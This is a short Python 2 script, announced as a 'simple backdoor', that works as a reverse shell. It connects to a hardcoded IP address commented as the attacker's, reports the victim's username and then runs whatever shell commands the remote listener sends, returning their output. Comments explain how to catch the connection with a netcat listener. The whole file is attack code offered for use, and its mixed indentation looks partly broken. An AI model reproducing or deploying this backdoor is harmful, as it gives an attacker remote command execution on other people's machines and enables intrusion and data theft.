#!/usr/bin/python
# Simple Backdoor In Python :)
# Coded By Saeed Ahmeed :)

import socket,subprocess,os
IP = "139.162.161.211" #Attacker IP
port = 443 # PORT

# Listener Use NetCat On Port You Selected
# In My Case Here I Select The IP [localhost] and Port Is [443]
# So To Create Listener Use Command netcat -lvp 443

def runCMD(cmd):
        runcmd = subprocess.Popen(cmd,
                                  shell=True,
                                  stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE,
                                  stdin=subprocess.PIPE)
        result = runcmd.stdout.read() + runcmd.stderr.read()
        return result
def shell():
    global s
    user = runCMD("whoami")
    s.send("["+user.strip()+"]Connected:~# ")
    while True:
        cmd = s.recv(1024)
        if cmd.strip() !='' and cmd.strip().split()[0] =="cd":
        	try:
                os.chdir(cmd.strip('cd ').strip())
                s.send("\nChanged TO[ {}/ ]".format(cmd.split()[1]))
	  except Exception,e:
		s.send("\nbash: cd: {}: No such file or directory\n".format(cmd.split()[1]))
		shell()
        if cmd.strip() !='' and cmd.strip() == ":kill":
	    s.close()
            break
	if cmd.strip() !='' and cmd.strip() !=':kill' and cmd.strip().split()[0] !="cd":
          s.send(runCMD(cmd))
          s.send("\n["+user.strip()+"] Connected:~# ")
	else:
	  s.send("\n["+user.strip()+"] Connected:~# ")
try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((IP, port))
  shell()
except Exception:
	exit(1)
# Done
